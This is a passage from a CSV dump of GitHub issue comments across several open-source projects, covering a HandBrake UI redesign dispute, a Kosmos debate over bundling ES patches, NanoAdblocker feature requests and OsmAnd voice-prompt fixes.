serve both of them? ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/423756513,"I took care with my comments took your proposal quite seriously. I'm not sure how I can be more clear that changes aren't ""necessarily bad"", only that we seem to be making different assumptions about what the core workflow is and should be. I hadn't seen the associated screen shot until you just posted it, so please pardon any confusion over dimensions and such. Anyway, I'm not really interested in answering your additional questions. I tried to be thoughtful and I don't really appreciate how you've characterized my comments. ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/423794084,"Maybe you and I have different definitions of ""seriously."" By taking it seriously, I meant engaging in specifics, asking clarifying questions and showing an interest in understanding the proposal fully. You instead presented a series of arguments as to why you don't need to think about the specifics of the proposal. That HandBrake is on a ""proven successful"" path. That you've done a lot of improvements. That you want to do more improvements. That normal humans successfully use it. All of which is great, but none of which has any bearing on the merit of the proposal. There are many successful major UI redesigns where before everything was doable and nobody had any complaints, but things still got better after it was reworked. The Windows 7 taskbar, Office ribbon, Blackberry/windows mobile phones -&gt; iOS/Android. Before the changes these all had perfectly usable interfaces with lots of incremental improvements and no specific issue that required the change. Anyway your ""core workflow"" that you claim drives the difference in the HandBrake UI is really not that different. The proposed UI makes that workflow efficient as well, because it's just a subset of the one I described. The final thing that gives me the feeling that you are not taking it seriously was the fact that you marked it as ""rejected"" before any discussion took place and before you even understood the proposal fully. You thought that needing to add filters was going to be a real problem for it. It almost seems like you didn't even bother running VidCoder to get a sense of how it could be working or how it feels to use. Or if there were really any concrete downsides to it! But yes, as you said, you are of course free to ignore any questions or suggestions I have. I figured you probably would, rather than bother to engage, ask clarifying questions and collaborate to reach a common goal. But I had to try. ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/423829111,"You should have engaged with us earlier with your ideas and discussed them one at a time before implementing everything if you expected our buy-in. If you were afraid we would say ""no"", that's a pretty good indication it needs to be discussed. We could have discussed this in easier bite sized chunks and we could have spent the time to fully discuss why your starting assumptions are incompatible with our plans for the future and perhaps influenced your design to fit to those plans. Just as a guiding principal, a complete instantaneous replacement of the HandBrake GUI is out of the question.  Gradual migration, testing each idea and getting user feedback as we go, has been our mode of development for a very long time.  This is how we plan to continue development. If you have specific ideas with limited impact, feel free to propose them.  But don't expect us to wade through a large collection of ideas in a massive redesign to pick bits that can be migrated in as part of our continual improvement to HandBrake.  To be frank, I just don't have the time for it.  I'm very busy with non-HandBrake real life things.  I've had no time in the last couple weeks and it's looking like I'll have no time in the next couple weeks.  So if you want feedback from me, you've got to keep it down to something I can read and respond to in a few minutes. Also keep in mind that any new design has to be propagated to all 3 GUIs.  Some designs do not fit well with the UI paradigms of the other platforms.  Compromises must be made for the sake of consistency sometimes.  Bradley and Scott have both spent a lot of time prototyping designs and sharing them with the group before implementation so that we can discuss the impacts of the design. This helps in keeping us all in sync with a design that works on all platforms. ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/423833365,"I'm not asking for an instantaneous replacement of the HandBrake GUI. I don't expect you to get on board with everything all at once. I tried to scope this suggestion to one idea Move the encoding settings to their own helper window and show source data with pickable tracks on the main one. It really can't be broken down any further than that. The rest of the post is explaining the reasoning behind it and the downstream benefits I see from it. I do realize that you want all 3 GUIs to have the same design. I would love to hear from them if there are any difficulties in making the change. If it helps, you can look at VidCoder as the ""prototype"". Play around with it and see if the idea could work in HandBrake. I don't expect buy-in without discussion. I would like to hear why you think this idea is incompatible with your future plans. In any event, I'm not complaining to you about having to spend all this work on changes you're not implementing. I'm not sorry I went and built my own UI because hundreds of thousands of people have used it, people have thanked me for it on a regular basis, and I'm darn proud of it. I'm here asking for a discussion because I realized we really do have the same goals and working together we could make something much better. And because what's in the past doesn't really matter, just how we can make the software better in the future. ",False,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/435210788,"@friend We didn't ""go through it"" this time. You just closed it without even reading. If you had, you would have realized that every single one of the usability concerns brought up originally ended up never materializing. I haven't had a single user complain and ask to bring the settings back into the main window. At least now I know with certainty that making my own UI was the right thing to do. It's infuriating dealing with people who tell you ""that's bad UI"" without a single valid reason to back it up. And who, when politely challenged simply reject, ignore and lock rather than discuss in good faith. ",True,True,False,HandBrake/HandBrake/1584
HandBrake/HandBrake/1584/435215570,"How many times would you like to go through this and similar suggestions, accuse others of not taking your ideas seriously despite hours of consideration over days in public and private, and meet our constructive responses with argumentative and harassing behavior? We've presented nothing but kindness in good faith. I encourage you to read our Code of Conduct. Nothing we've read from you in our recent interactions respectful of opposing viewpoints, gracious in light of constructive criticism, empathetic, or fostering community. In short, it is clear our views differ; that does not give you a right to behave badly. Harassment in public or private will not be tolerated. This topic is now closed and locked, same as #1657. Feel free to address further concerns with me and/or other team members directly. ",False,True,False,HandBrake/HandBrake/1584
HexEdit/strobejb/10/33865769,"Hi James, This fix makes HexEdit to automatically pick up changes in the typelib files. Looks like this feature was implemented at some point but got broken later. This patch is cleaner than my previous pull request. It's in a feature branch, and it does not include any build compatibility changes. ",False,True,False,HexEdit/strobejb/10
HexEdit/strobejb/10/43596729,"Hi! Thankyou for contributing all these fixes, it's very much appreciated! I'll handle these pull requests over the weekend (too busy until then).. cheers ",False,True,False,HexEdit/strobejb/10
HumTestData/humera987/1045/355848372,"Project    humera_testing_new Job    UAT Env    UAT Region    FXLabs/US_WEST_1 Result    fail Status Code    200 Headers    {X-Content-Type-Options=[nosniff], X-XSS-Protection=[1; mode=block], Cache-Control=[no-cache, no-store, max-age=0, must-revalidate], Pragma=[no-cache], Expires=[0], X-Frame-Options=[DENY], Content-Type=[application/json;charset=UTF-8], Transfer-Encoding=[chunked], Date=[Fri, 31 Aug 2018 055256 GMT]} Endpoint       Response   {   ""requestId""  ""None"",   ""requestTime""  ""2018-08-31T055256.987+0000"",   ""errors""  true,   ""messages""  [ {     ""type""  ""ERROR"",     ""key""  """",     ""value""  ""findAll.arg0 must be greater than or equal to 0""   } ],   ""data""  null,   ""totalPages""  0,   ""totalElements""  0 } Logs   Assertion [@friend != 200] failed, not expecting [200] but found [200] --- FX Bot --- ",False,True,False,HumTestData/humera987/1045
Hygieia/Hygieia/1156/205926366,"This PR adds a link to the Sonar instance for the project as determined by the collector.  The 'View All' link can be found on the widget near the header for the scan results. Link does not go to sonar page until data is loaded into the widget, since data has not been populated yet it would not know where to go. Tried to achieve same look and feel for links as in other places in application.   Resolves #1122 ",False,True,False,Hygieia/Hygieia/1156
IdentityServer4/IdentityServer/3306/450434410,"Repro  Register a client credentials client with no allowed scopes Request a token Client Authentication is Successful but a ""Token Issued Failure"" event is generated with an ""invalid_scope"" error  Should client credential clients be allowed to get access tokens if they do not have any allowed scopes? I have some APIs that just need a valid access token and don't care about the aud or scope claims. It's easy enough to work around by creating and assigning a dummy scope to the client for these scenarios. ",False,True,False,IdentityServer4/IdentityServer/3306
IdentityServer4/IdentityServer/3306/498108953,A scope is mandatory in our implementation. ,False,True,False,IdentityServer4/IdentityServer/3306
KGreencity_test/Kteamworks/3/288926981,"In the patient registration form- a) Patient Title is mandatory - it should have default value b) Patient Name is mandatory- First name atleast c) Patient gender - should be mandatory d) Patient gender value- Male, Female, Other e) Patient country/state/city- should not be blank- default value needs to be there f) Patient pin code- basic verification needs to be done for alphabet and special characters ",False,True,False,KGreencity_test/Kteamworks/3
KnpMenu/KnpLabs/213/129397811,please also enable the directory cache for $HOME/.composer/cache/files so that we have a change to reuse cached downloads between builds ,False,True,False,KnpMenu/KnpLabs/213
KnpMenu/KnpLabs/213/129409308,"@friend Done. Cached for , as spotted in Doctrine. Is there any relevant difference? ",False,True,False,KnpMenu/KnpLabs/213
KnpMenu/KnpLabs/213/134936600,"great, thanks! ",False,True,False,KnpMenu/KnpLabs/213
KnpMenu/KnpLabs/213/99917627, force container based builds make phpunit run explicit  ,False,True,False,KnpMenu/KnpLabs/213
Kosmos/AtlasNX/187/411236297,Probably just offer 2 zips to download. You happy now @friend? shrek ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/464521616,aren't those already available..? ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/464523878,@friend Wants them to be opt-in so that RetroNX doesn't have to ban Kosmos ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/464849347,But then it needs an option in the Kosmos Updater wether you want ES patches or not. ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465068060,That option should only exist if es patches are installed already prior. ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465080491,"I think the option should always be there, but it can default to On if the user already has them. So it's opt in for new users. ",False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465081420,The whole point of separating them is exactly to not provide a option in the CFW and have the user opt-in by adding the files manually. Having them default available via a bundled tool would make it ban-able. Being a extra download on the same Site is as far I want to go. Edit I don't care tho if the user already has them installed ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465083779,"That is t very user friendly. What I'm saying is by default it will be off, unless you already have es patches installed then it will be turned on. I think this fulfills what you are asking. I'm not going to hide the option as that only leads to confusion to the end user. ",False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465084294,@friend Feel free to close the Issue and we just ban it then. Sad to see this turn into another piracy fw. ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465088560,"@friend why is it such a problem to offer an option for users to purposely activate the ES patches ? It's not illegal, and nobody's' forcing anyone to actually run backup using ES patches, even though it's their only purpose. The guns and bullets are not illegal, it's the user than can use them illegally. ""Having them default available via a bundled tool"" that's exactly the point. They are not activated by default, their are just offered to someone willing to use them. That's exactly like google API used for different purposes than what they were intended for testing or educational purpose/context (like in QGIS which can be used in commercial environment yet maps API is offered optionaly with a click of a toggle). Providing option is NOT supporting the misuse of that option. Don't really understand why so much time is spent on this especially noting that it doesn't affect retroNX in any way. ""The whole point of separating them is exactly to not provide a option in the CFW"" the whole point of this issue is to satisfy your point of view which is not to provide a piracy CFW pack. Making them optional and not bundled is exactly doing what you were asking in the first place. PS I'm not talking in the name of Kosmos or AtlasNX. ",False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465090518,"@friend That's where we draw the line and enforce it. It does affect RetroNX as we have to comply with Rule 1, also you don't need ES patches for real backups, you only use them for piracy. ♠Making them optional and not bundled is exactly doing what you were asking in the first place.` Honestly thats just evading the Issue for me for ""piracy UX"" I am fine if the option exists after users opt-in by manually copying the patches over. ",False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465093526,I'm also not talking for the entire team either. I'm just talking for Kosmos Updater. And seeing as Kosmo Updater is suppose to be user friendly and to make it so the user doesn't have to manually copy files over then that is where I'm coming from. ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465093769,@friend I would absolutely agree if it was anything other than these patches. ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465096181,"Thanks for taking the time to reply. So the line is just between manually pressing a button and manually copying a file on the SD ? I'm sorry but I don't humbly see where is the difference. In both case it's entirely user intent to perform a manual action. The fact that it is somehow facilitated by Kosmos updated is still not making that action automatic. Would an hidden menu with a disclaimer (disclaimer specifically mentioning that it should not be used to load illegal backups) and a sequence of button to press be more acceptable and not crossing the line ? Yes es has one intent only, but it's not because you provide an open door that the users have to enter and do illegal stuff - even though it might be its only purpose (of ES patches), we can't judge on intent but on actions only. ",False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465096481,I think we came up with a solution I'm okay with. No options in Kosmos Updater. If the user has ES Patches already installed Kosmos Updater will continue to update ES Patches. If the user doesn't already have ES Patches then it won't install/update them. ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465097231,"A Konami code or a file flag would be fine with me too (including disclaimer) Users should just not be exposed to it out of the box (minus dl page), I mean you can literally call it ""Piracy On/off"" else. @friend That is acceptable for me. 👍 ",False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/465272667,@friend Please don't go off-topic in a github issue - Github is not a social hub. ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/466729376,Implemented in latest release v11.10.0 ,False,True,False,Kosmos/AtlasNX/187
Kosmos/AtlasNX/187/466796953,"""Turn into""? Hasn't kosmos had the patches all along? ",False,True,False,Kosmos/AtlasNX/187
Laravel-Excel/Maatwebsite/1768/353119678," PHP version 7.1.7 Laravel version 5.6 Package version 3.0  Description Is there a way I can use my Exportable Model properties inside headings &amp; map? I trued to call  within those methods and get unknowned property of null error. I want to be able to dynamically change the headers and data based on this certain ""type"". See below Code ",False,True,False,Laravel-Excel/Maatwebsite/1768
Laravel-Excel/Maatwebsite/1768/415175016,"Thanks for submitting the ticket. Unfortunately the information you provided is incomplete. We need to know which version you use and how to reproduce it. Please include code examples. Before we can pick it up, please check ( and add the missing information. To make processing of this ticket a lot easier, please make sure to check ( and double-check if you have filled in the issue template correctly. This will allow us to pick up your ticket more efficiently. Issues that follow the guidelines correctly will get priority over other issues. ",False,True,False,Laravel-Excel/Maatwebsite/1768
Laravel-Excel/Maatwebsite/1768/415756037,Does the developer ever comment on these issues? ,False,True,False,Laravel-Excel/Maatwebsite/1768
Laravel-Excel/Maatwebsite/1768/415761006,"Dear Taylor, Yes, our developers try to help as much as possible. Please read this information  you need elaborate support or need it urgently, we can offer this on a commercial basis. Please contact info@friend.nl or via phone +31 (0)10 744 9312 ",False,True,False,Laravel-Excel/Maatwebsite/1768
Laravel-Excel/Maatwebsite/1768/415858492,"We offer support on based on best effort. If you don't respect that, than we can't help you. Our software is fully optional. ",False,True,False,Laravel-Excel/Maatwebsite/1768
LearningMachineLearning/graceavery/1/171191261,Thanks for this project - looks great.  I am having some trouble compiling. If I have time - I'll fix and submit a pull request.  It might be an idea to shoot straight for swift 3 compatibility.  ,False,True,False,LearningMachineLearning/graceavery/1
LearningMachineLearning/graceavery/1/239829452,fyi - it's possible to automatically heal some of these  ,False,True,False,LearningMachineLearning/graceavery/1
LearningMachineLearning/graceavery/1/239829563, ,False,True,False,LearningMachineLearning/graceavery/1
LearningMachineLearning/graceavery/1/300530724,"xcode 8.3 maybe saving grace. &lt;img width=""1352"" alt=""screen shot 2017-05-10 at 11 55 51 am"" src=""",False,True,False,LearningMachineLearning/graceavery/1
LightMarker2/NeilLi1992/3/285161047,"Currently when a bookmark is removed by bookmark manager or by the chrome's own bookmark, Light Marker is unaware of this. Add listeners to realize full two-way sync. ",False,True,False,LightMarker2/NeilLi1992/3
LightMarker2/NeilLi1992/3/354612823,Resolved by commit 613ba9a641ab69ef14140d45597cb4fa9803ee18 ,False,True,False,LightMarker2/NeilLi1992/3
LiipFunctionalTestBundle/liip/328/239155875,"Hi, The WebTestCase's  method throws a deprecation warning on Symfony 3.3 projects Related to ",False,True,False,LiipFunctionalTestBundle/liip/328
LiipFunctionalTestBundle/liip/328/311676533,"I had a comma wrongly placed in my yaml doctrine mappings like this         password             type string             length 64,  Removing it solved the problem. Sorry. Closing ",False,True,False,LiipFunctionalTestBundle/liip/328
Logging-Level-Evolution-Plugin/ponder-lab/184/432232535,Steps to reproduce  Perform a rejuvenation and preview the results. Select back. Select new options. Select next.  ,False,True,False,Logging-Level-Evolution-Plugin/ponder-lab/184
LiipFunctionalTestBundle/liip/328/311665051,"No @friend  Right now this is the only fixture I have in the project class LoadUserData extends AbstractFixture implements OrderedFixtureInterface {     public function load(ObjectManager $manager) void     {         $user = $this-&gt;createUser('joey');         $manager-&gt;persist($user);         $manager-&gt;flush();         $this-&gt;addReference('user', $user);     }      private function createUser(         string $username,         string $password = '$2y$13$JTAzYtc2aRE0Ma3gYpxmbeI6vuxy1uJcok1Dg/QKgaVwiqrrsngae'     //Password = 12345678     ) User {         return new User($username, $password);     }      public function getOrder() int     {         return 1;     } }  ",False,True,False,LiipFunctionalTestBundle/liip/328
METADATA.jl/JuliaLang/7295/195560663,"I have no idea how the wrong SHA1 got in there, but I did have some PkgDev problems... Attobot is now installed, so I cannot mess it up again! ",False,True,False,METADATA.jl/JuliaLang/7295
METADATA.jl/JuliaLang/7295/267066934,You really should not change sha of existing tags. How did Travis pass on the original PR? ,False,True,False,METADATA.jl/JuliaLang/7295
METADATA.jl/JuliaLang/7295/267067428,"Please don't do this. This was just a repeat of the existing tag, so it would have been far preferable to tag the right sha as 0.7.2 and not touch what had already been released. This makes the meaning of 0.7.1 depend on when METADATA was checked out, which is not how versions are supposed to work. ",False,True,False,METADATA.jl/JuliaLang/7295
METADATA.jl/JuliaLang/7295/267093991,You should actually still make an 0.7.2 tag for this. Anyone who upgraded to the original 0.7.1 might not see this update at all. ,False,True,False,METADATA.jl/JuliaLang/7295
METADATA.jl/JuliaLang/7295/267103986,Im very sorry. Will tag when at a computer. ,False,True,False,METADATA.jl/JuliaLang/7295
MyJavaLearningCode/nvkulkarni21/1/248232283,First version of .java file from home laptop ,False,True,False,MyJavaLearningCode/nvkulkarni21/1
MyJavaLearningCode/nvkulkarni21/1/320492318,Verified correct ,False,True,False,MyJavaLearningCode/nvkulkarni21/1
NanoCore/NanoAdblocker/87/287260640,i think this is the best enhancement ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356443671,I don't see a reasonable implementation of this... ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356444124,"Filter lists can limit the amount of domains each rule apply to with many ways. If you need to set a different set of filter lists for each domain, then chances are the filter lists you are using are kind of broken.  And there isn't a reasonable way to swap filter lists sets internally. ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356447669,"it depends on how the internal data structure of the core looks like if the rules still have a reference to the list they came from then it shouldnt be too hard to just ignore them on a specific website just like you can switch off blocking completely for a site. if the internal structure is just a huge merged and optimized set of rules, which i assume is the case, then you would have to rebuild that internal structure once you click on that button or when you later load that site again or if you leave and all filterlists should be on again. if the performance hit is too great then there are two ways to deal with it. generate an internal structure for each new combination of active lists and keep it for later or use the normal datastructure when all lists are on and if one or more are disabled then execute each least sequentially. this could behave differently than a combined list, like you mentioned, so maybe some sort of hybrid would be needed. so, yeah, not an easy task if my assumptions about the project are correct. but it would still be a very worthwhile feature that you shouldn't give up that easily. maybe gorhills rework of the engine makes this easier to implement. ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356449799,"Whitelist just completely disables filtering, that's different than disable one specific filter list for that domain. Currently, if I understood the code right, each filter list will be compiled separately and stored, all selected filters are merged together. The merging process need to be done every time a filter list is turned on or off. There are also snapshots of internal states for fast startup. I can't think of a single use case. Did you spelled ""harder"" wrong? ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356460317,"i dont think he wanted whitelisting. if you have experimental or generic filterlists that work well most of the time but occasionally break sites then you want to quickly disable the list for this specific website but not in general and you do not want to go through the dashboard every single time you visit that site again. you should also contact the maintainer but it will take time until it is fixed. you could even just move along and after a few weeks you look up your dynamic rules and post a bug report with all the problems you collected over time but were too lazy to report at that moment. well, unlikely but at least possible ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356461593,"Just override the rule with your custom filters, that's what it's for. ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356463212,"while still a lot more work than 2 clicks i could do this. most people wont. blocking something with the element hider is something many would be capable but figuring out an exception rule is too much for casual users who just set it up, tweak a few options and select and install a few lists and then call it a day. not everyone is going to read the wiki about the filter syntax and then debug every page that causes problems. giving them a better option than having to switch off Nano Blocker entirely or uninstalling a list just because of one or two false positives would really add some usability benefit. ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356465040,"If you are a casual user, chances are you won't be adding filter lists other than those that come with Nano Adblocker.  If you are a casual user, chances are you won't be able to know which filter list you have is causing the problem.  If you can find out which filter list is causing the problem you will be able to set up the exception filter. If you absolutely need to toggle between two sets of filters, use browser profile. This is non-trivial and only has theoretical use case, I'll decline this feature for now. ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356465261,What I will do is to add a button in Logger that turns off a rule. ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356469661,mayby quick access to off specific rule on single site example.  ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356473436,"If you find yourself have to toggle a filter list frequently, then you probably need to figure out what exactly is wrong. ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356477516,you do not only want this when something is wrong. maybe you have a list that implements a night mode and you personally do not want it on a specific site or a floating header that you want for some special use case or you want to allow ads for a site but not tracking and annoyances.... besides that it is great for trouble shooting. you turn off lists as long as the site works again. then you immediately know who to send a bug report to. ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356479301,"If you need a night mode or any other mode, use browser profile.  For trouble shooting, use the Logger. ",False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356515829,make a browser profile for every website? thats not practical. you do not need that many tries if you always the disable half of the remaining ones. ~log2(n) turns. ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356574112,an ordinary user will not be able to and will not want to look into the logger. ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356580154,like this?  ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356602225,You do realize there are over 100 000 rules enabled by default right? ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356602438,on single site?  O ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356603054,There are well over 10 000 rules affecting every single site. A lot of generic rules in EasyList. ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356603912,hmm.. you can segregate this rules to category and hide ,False,True,False,NanoCore/NanoAdblocker/87
NanoCore/NanoAdblocker/87/356608801,"gorhill has his decisions, I have mine. If you disagree with both, then you have to look for another fork, or fork yourself, then you don't need to convince me to implement the feature. Maybe we have a different definition of ""casual user"", but I don't think any of the proposed feature is useful. If you need a per-site profile, then chances are you are not a casual user, and should use a custom filter list for that.  Listing active rules on the popup will definitely not be easier to use than the Logger, and casual users cannot understand what they are seeing. If Logger is too complex for them, putting a smaller Logger in the popup will just be worse. I'm not sure what that means, you are welcomed to teach me how to code, but do so in Pull Requests.  I'm locking this as it's not getting anywhere, if you truly believe this feature is necessary, please Pull Request, I can test out the result and maybe I will change my mind. ",False,True,False,NanoCore/NanoAdblocker/87
NewFTCApp-iOS/FTChinese/2/267425497,"Some tabs, especially those under MyFT, are wrong under iPad. ",False,True,False,NewFTCApp-iOS/FTChinese/2
NewFTCApp-iOS/FTChinese/2/338448341,Removed the regular collection view code. ,False,True,False,NewFTCApp-iOS/FTChinese/2
Nutrition/Harvesters/6/51810792,The site coordinators editor needs to have the ability to assign a person to multiple program hosts.  Each entry should have unique contact information for each program host. ,False,True,False,Nutrition/Harvesters/6
Nutrition/Harvesters/6/66786793,"After reviewing this again, I'm now convinced that an ""Active"" flag is needed for both the contact record as well as the connector to the program host record.  The following DB change will be needed ALTER TABLE Contacts   ADD COLUMN Active tinyint UNSIGNED NOT NULL DEFAULT 1; Code changes to support this will be going into the site coordinator model. ",False,True,False,Nutrition/Harvesters/6
OpenUpgrade/OCA/500/155289137,Fix partner migration performance by bypassing ORM method and doing mass data update and insert. This modification allows me to pass migration time of partners from ~ 4.5 hours to 15 mn (about 116000 partner). ,False,True,False,OpenUpgrade/OCA/500
OpenUpgrade/OCA/500/224311413,"Interesting, thank you. Tentative plus one (no test). ",False,True,False,OpenUpgrade/OCA/500
OpenUpgrade/OCA/500/225560378,I just ran this on a customer database and it works. But I think you need to address  before this can be merged. ,False,True,False,OpenUpgrade/OCA/500
Osmand/osmandapp/3663/221975343,"There are a couple of areas where I think it would be nice to have some polish on the driving instructions issued, and when. As a navigator I was always taught 'don't issue an instruction unless it's to change road', and as a driver I completely understand that.  Especially on a motorway, being told every mile or two 'keep right' gets very old very quickly.  I'd rather be told the distance to the point at which I would leave the road I am currently on, and instructions issued for that point only. Also, it seems arbitrary when the 'keep right/left' instruction is actually called - not sure if that's an OSMand issue or something to with the nodes in the OSM data itself. Any chance we can have this as an option? Also, the instruction 'turn slightly right' can be very ambiguous at junctions.  In line with what I mentioned above, I think for clarity having the option to just say 'turn left' or 'turn right' to indicate leaving the current road and moving on to a new road, irrespective of the severity of the turn, would reduce any confusion.  That way the driving instructions aren't overly verbose - they are clear and concise.  Of course I understand that other people might be used to having such verbosity from other driving aids, which is why I'm suggesting making them optional. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/294339098,"May I add a point here sometimes I heard the instruction ""prepare yourself to enter the roundabout in 1 km"" (approximative translation). I don't understand to goal of this one, I think it's useless. What do you think? ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/294343018,"It's no different really to 'After about 1km, turn left'.  And some roundabouts can be quite complex, so being aware to concentrate on upcoming roadsigns about the roundabout is a good thing, in my view anyway.  To me, that 'upcoming change of road' is part of the instruction for that road change I was talking about. But obviously that's just me. -) ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/294344147,"Disagree with @friend. Imagine you have to drive 225 km to your motorway exit, it is extremely useful to get an announcement that your exit is coming soon now. No it is quite useful. If I get 'turn right' I expect to have to break to slow speed to make a 90 degree turn. If I get 'turn slightly right' the road is forking off at a nice angle and I can do that slight turn at higher speed. And the opposite for 'sharp right'. So the 'severity of the turn' is quite relevant for my driving. This is not what OsmAnd does, to my experience. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/294364603,"See ""Take the right hand road"" then.  Unless you want OSMand to give pace notes (which, to be honest, I would be -very- for ;-) ) Perhaps not on the roads you are on.  But on the roads I drive, there are motorway exits every couple of miles. And, if you'll note, I did stress that I suggested it be an -option-.  All your arguments are for what -you- want, which is also what I'm suggesting, so thanks for backing me up -D ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/294736480,"So we need to define complex for OsmAnd, because I often hear this instruction for simple rondabouts (like this one  not the distance which I don't understand, it's more the instruction. Do you see what I mean? ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/296354175,"@friend When I read your comment about ""Prepare yourself ..."" and so on, this sounds in deed very clumsy and obsolete. Looks like there is simply a translation issue here with whatever language you are using In English our prompt is simply ""After about 1 km enter a roundabout."", which is short an unobtrusive. If you let me know an equally short translation for your language I can easily fix this prompt (independent of anything bigger we may or may not do about trying to discriminate between larger and smaller roundabouts). @friend I never hear keep left or keep right when passing any motorway exits I am not supposed to take, can you please specify specific locations so we can reproduce? Regarding ""slight turns"" While it is not very easy to always determine the turn angle as it appears to a driver in the real world, it is in deed conventional in all navigation systems I have tested to try and prompt slight and sharp turns. This is useful in cases of forks (where there is really less of an actual ""turn"" to be made), or e.g. in case of 3-way forks to indicate which of these to take. I cannot see that dropping our attempt to announce slight or sharp turns would actually be a general improvement. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/296370678,"@friend Ok, thanks, implemented! It is in our nightly, and will be in the next release. I believe this to be a leftover from years ago, there was a point when we had lots of ""Prepare for ..."" all over in our voice prompts, and it is usually a rather unconventional and useless phrase. I have removed in many languages a long time ago, but for some I rely on translators, and it looks like no-one ever cared for this one. If you find any more improvements worth implementing in fr-tts, please let me know, or better create a pull request, ok? Thanks, Hardy ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/296372196,"Cool, that was quick! I'll try it in the next beta release. Thanks for the information about the tts, until now I was only fixing translations via Weblate. About the legacy values in the tts, I noticed that some strings are not in the  (like ) but present in the . A first step in cleaning that even better, would be to sync the source values. What do you think? ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/296375266,"Yes, much appreciated. In English, there is no  string because it is not needed there, I create the contract between the pre-announcement and the closer warning by using ""After..."" vs. ""In..."". But in the French config file,the string is in use in command , which is Button 6.1 in my ""Test voice prompts"" system under the Development settings. Please take a look, we would have to redesign that prompt. Please compare in contrast to prompt 6.2 (which would be played closer to the turn). For comparison, try these 2 buttons usingEnglish (select en-tts upon entering the test screen). Please note  You could test any tts-config file on your device as follows download the original  ttsconfig.p from our branch, and modify locally at will. Then, rename it to _ttsconfig.p, and create a folder like fr_test-tts next to the other voice folders (like Android/data/net.osmand.plus/files/voice/fr_test-tts or similar) in your osmand data folder on your device. If you put your modified _ttsconfig.p file in that new folder, you can select it in OsmAnd to be used. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/296779087,"@friend  can't recall exactly which junctions, (it may actually be the M8, not the M9) but it certainly does it.  In fact, it does it so often that I can't recall specifics, I just thought it was 'a thing'. Also, with this junction  the instruction issued was ""keep right"" which is totally unecessary, and in fact confusing given it's a crossroads (which is why I recall it specifically).  There have been a couple of occasions where 'keep right' has been read out where it actually meant 'take the right hand exit' at a fork (which is why I wasn't sure if it was just bad data from OSM or not). Again, for the exits, it's happened so often that the sharp/slight turns aren't mentioned at all when they might have been necessary, and mentioned where there was no need, and in a couple of instances just completely wrong, that I've just bundled it up as 'something wrong with the OSM data/something silly that OSMand does' that I don't even think about specifics any more, it just frustrates me every time.  My brain translates it as 'check what the map shows because that will give you more information than the audio' which defeats the purpose a little. ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/307503227,"@friend FYI I just heard the instruction ""prepare yourself to enter the roundabout in 1 km"". Shouldn't suppose to be fixed with your change? (OsmAnd+ 2.6.5) ",False,True,False,Osmand/osmandapp/3663
Osmand/osmandapp/3663/307610461,@friend Looks like this change in fr-tts is in our master branch but did not make it into our 2.6 branch. An oversight? Should I have it marked somehow? Thx - Hardy ,False,True,False,Osmand/osmandapp/3663
